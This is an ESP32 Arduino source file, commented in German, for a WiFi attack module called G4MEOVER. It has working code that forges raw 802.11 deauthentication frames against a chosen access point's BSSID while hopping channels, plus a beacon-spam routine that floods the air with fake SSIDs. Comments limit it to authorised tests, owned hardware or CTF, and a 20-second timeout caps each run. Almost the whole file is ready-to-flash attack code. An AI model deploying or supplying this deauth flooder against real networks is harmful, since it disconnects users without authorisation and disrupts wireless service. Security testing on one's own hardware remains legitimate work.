// G4MEOVER — WiFi-Angriffsmodul (Implementierung). Siehe wifi_attack.h.
// NUR fuer autorisierte Security-Tests / eigene Hardware / CTF.
#include "wifi_attack.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

// Sicherheits-Timeout: kein Angriff laeuft laenger als das ohne erneuten Befehl.
#define ATK_DEFAULT_MS   20000u
#define ATK_HOP_MS         180u     // Kanal-Wechsel-Intervall beim Hopping
#define ATK_BURST          6        // Frames pro loop()-Tick

enum AtkMode { M_NONE, M_DEAUTH, M_BEACON };

static AtkMode  s_mode      = M_NONE;
static uint8_t  s_espnowCh  = 1;
static uint8_t  s_bssid[6]  = {0};
static uint8_t  s_fixedCh   = 0;        // 0 => hoppen
static uint8_t  s_hopCh     = 1;
static uint32_t s_untilMs   = 0;
static uint32_t s_lastHop   = 0;
static uint8_t  s_scanCount = 0;
static uint32_t s_txOk      = 0;

// Gefaelschte SSIDs fuer Beacon-Spam (mode 0). Bewusst harmlos/erkennbar.
static const char* SPAM_SSIDS[] = {
    "G4MEOVER-FREE-WIFI", "GAME OVER pls insert coin", "FBI Surveillance Van 4",
    "Pretty Fly for a WiFi", "Loading...", "Mom Use This One", "Virus.exe",
    "Hidden Network :)", "Tell my WiFi love her", "NSA-Backdoor",
};
#define SPAM_SSID_COUNT (sizeof(SPAM_SSIDS) / sizeof(SPAM_SSIDS[0]))

// ---- 802.11-Frame-Vorlagen ----
// Deauth (26 Byte): addr1=Client (broadcast), addr2/addr3=AP-BSSID, Reason 7.
static uint8_t s_deauth[26] = {
    0xC0, 0x00, 0x00, 0x00,                   // FC (Deauth) + Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // addr1 = Ziel (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // addr2 = AP (wird gesetzt)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // addr3 = BSSID (wird gesetzt)
    0x00, 0x00,                               // Seq
    0x07, 0x00,                               // Reason 7
};

static void set_channel(uint8_t ch) {
    if(ch < 1) ch = 1; if(ch > 13) ch = 13;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void send_deauth() {
    memcpy(&s_deauth[10], s_bssid, 6);   // addr2 = AP
    memcpy(&s_deauth[16], s_bssid, 6);   // addr3 = BSSID
    for(int i = 0; i < ATK_BURST; i++) {
        if(esp_wifi_80211_tx(WIFI_IF_STA, s_deauth, sizeof(s_deauth), false) == ESP_OK) s_txOk++;
    }
}

// Baut + sendet einen Beacon mit gegebener SSID auf Kanal ch (zufaellige BSSID).
static void send_beacon(const char* ssid, uint8_t ch) {
    uint8_t f[128];
    int n = 0;
    const uint8_t hdr[] = {
        0x80, 0x00, 0x00, 0x00,                       // FC (Beacon) + Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,           // addr1 broadcast
        0x02, 0x00, 0x00, 0x00, 0x00, 0x00,           // addr2 (locally-administered, unten gesetzt)
        0x02, 0x00, 0x00, 0x00, 0x00, 0x00,           // addr3 (= addr2)
        0x00, 0x00,                                   // Seq
    };
    memcpy(f, hdr, sizeof(hdr)); n = sizeof(hdr);
    // Zufaellige, aber stabile-pro-SSID BSSID (LAA-Bit gesetzt, unicast).
    uint32_t r1 = esp_random(), r2 = esp_random();
    f[10] = 0x02; f[11] = r1; f[12] = r1 >> 8; f[13] = r1 >> 16; f[14] = r2; f[15] = r2 >> 8;
    memcpy(&f[16], &f[10], 6);
    // Fixed params: Timestamp(8)=0, Beacon-Interval(2)=100TU, Capability(2)=ESS.
    memset(&f[n], 0, 8); n += 8;
    f[n++] = 0x64; f[n++] = 0x00;
    f[n++] = 0x01; f[n++] = 0x04;
    // Tagged: SSID.
    int slen = strlen(ssid); if(slen > 32) slen = 32;
    f[n++] = 0x00; f[n++] = slen; memcpy(&f[n], ssid, slen); n += slen;
    // Tagged: Supported Rates.
    static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(&f[n], rates, sizeof(rates)); n += sizeof(rates);
    // Tagged: DS Parameter Set (Kanal).
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = ch;
    if(esp_wifi_80211_tx(WIFI_IF_STA, f, n, false) == ESP_OK) s_txOk++;
}

void wifi_attack_init(uint8_t espnow_channel) {
    s_espnowCh = espnow_channel ? espnow_channel : 1;
}

uint8_t wifi_attack_scan() {
    // Synchroner Scan (zeigt versteckte). Danach ESP-NOW-Kanal wiederherstellen.
    int n = WiFi.scanNetworks(false, true);
    s_scanCount = (n < 0) ? 0 : (n > 255 ? 255 : n);
    for(int i = 0; i < n; i++) {
        Serial.printf("  AP[%d] ch=%d rssi=%d %s\n",
                      i, WiFi.channel(i), WiFi.RSSI(i), WiFi.SSID(i).c_str());
    }
    WiFi.scanDelete();
    set_channel(s_espnowCh);
    return s_scanCount;
}

uint8_t wifi_attack_last_scan_count() { return s_scanCount; }

void wifi_attack_deauth(const uint8_t bssid[6], uint8_t channel, uint32_t dur_ms) {
    memcpy(s_bssid, bssid, 6);
    s_fixedCh = channel;                 // 0 => hoppen
    s_hopCh   = channel ? channel : 1;
    if(channel) set_channel(channel);
    s_untilMs = millis() + (dur_ms ? dur_ms : ATK_DEFAULT_MS);
    s_lastHop = millis();
    s_txOk = 0;
    s_mode = M_DEAUTH;
}

void wifi_attack_beacon(uint8_t mode, uint32_t dur_ms) {
    (void)mode;                          // mode 0/1 nutzen dieselbe Liste + Zufall
    s_fixedCh = 0;                       // Beacon-Spam hoppt immer
    s_hopCh   = 1;
    s_untilMs = millis() + (dur_ms ? dur_ms : ATK_DEFAULT_MS);
    s_lastHop = millis();
    s_txOk = 0;
    s_mode = M_BEACON;
}

void wifi_attack_stop() {
    if(s_mode == M_NONE) return;
    s_mode = M_NONE;
    set_channel(s_espnowCh);             // Steuerkanal zurueckholen
    Serial.printf("WiFi-Angriff gestoppt (tx_ok=%lu)\n", (unsigned long)s_txOk);
}

void wifi_attack_tick() {
    if(s_mode == M_NONE) return;
    uint32_t now = millis();
    if((int32_t)(now - s_untilMs) >= 0) { wifi_attack_stop(); return; }

    // Kanal-Hopping (Deauth nur bei channel==0, Beacon immer).
    if((s_mode == M_BEACON || (s_mode == M_DEAUTH && s_fixedCh == 0)) &&
       (now - s_lastHop) >= ATK_HOP_MS) {
        s_hopCh = (s_hopCh % 13) + 1;
        set_channel(s_hopCh);
        s_lastHop = now;
    }

    if(s_mode == M_DEAUTH) {
        send_deauth();
    } else {  // M_BEACON
        uint8_t ch = s_fixedCh ? s_fixedCh : s_hopCh;
        for(int i = 0; i < ATK_BURST; i++) {
            send_beacon(SPAM_SSIDS[esp_random() % SPAM_SSID_COUNT], ch);
        }
    }
}

bool wifi_attack_busy() { return s_mode != M_NONE; }

const char* wifi_attack_state_str() {
    switch(s_mode) {
        case M_DEAUTH: return "DEAUTH";
        case M_BEACON: return "BEACON";
        default:       return "idle";
    }
}
